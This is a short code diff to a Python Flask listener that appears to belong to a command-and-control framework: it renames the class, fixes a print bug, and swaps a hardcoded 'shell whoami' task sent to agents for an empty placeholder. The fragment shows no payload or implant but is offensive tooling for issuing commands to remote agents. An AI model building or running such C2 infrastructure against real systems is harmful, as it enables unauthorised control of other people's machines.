@@ -6,8 +6,8 @@ cli = sys.modules['flask.cli']
 cli.show_server_banner = lambda *x: None
 app = flask.Flask(__name__)
 
-class Listener:    
-    def __init__(self, name, port=1337, ip="127.0.0.1"):
+class HttpListener:    
+    def __init__(self, name, ip, port):
         self.name       = name
         self.port       = port
         self.ipaddress  = ip
@@ -37,7 +37,7 @@ class Listener:
         """
         result = flask.request.form.get("result")
 
-        print(f"\n{result.strip}")
+        print(f"\n{result.strip()}")
 
         return ('', 204)
 
@@ -47,7 +47,7 @@ class Listener:
         """
         Returns an agents tasks
         """
-        task = "shell whoami" # TODO: change command
+        task = "" # TODO: read tasks
         return (task, 200)
 
 
